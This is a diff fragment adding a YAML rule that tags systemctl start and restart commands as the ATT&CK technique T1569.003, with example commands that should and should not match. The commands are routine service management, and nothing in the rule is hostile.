+  meaning: Starts or restarts a systemd service, which runs its program.
+  techniques: [T1569.003]
+  artifacts: [Service]
+  confidence: medium
+  platforms: [linux]
+  examples:
+    match: ["systemctl start x", "sudo systemctl restart nginx", "systemctl daemon-reload && systemctl start x"]
+    no_match: ["systemctl status x", "systemctl stop nginx", "systemctl is-active x"]
